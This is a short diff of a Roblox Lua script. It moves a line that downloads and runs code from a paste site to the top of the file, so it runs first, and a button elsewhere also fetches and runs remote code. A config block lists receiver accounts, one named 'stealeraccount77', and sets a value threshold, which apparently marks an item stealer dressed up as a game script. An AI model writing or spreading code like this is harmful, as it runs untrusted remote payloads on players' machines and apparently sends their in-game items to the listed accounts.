@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
+
+--script
+
 _G.NullConfig = {
     User = {"stealeraccount77", "bomaylatip", "ConCuTiHon02", "banpetuytin1111", "banpetuytin11114", "phatle8117"},
     min_value = 10000000000,
@@ -136,6 +140,3 @@ Tab:CreateButton({
         loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/limithub/refs/heads/main/limit"))()
     end
 })
---script
-
-loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
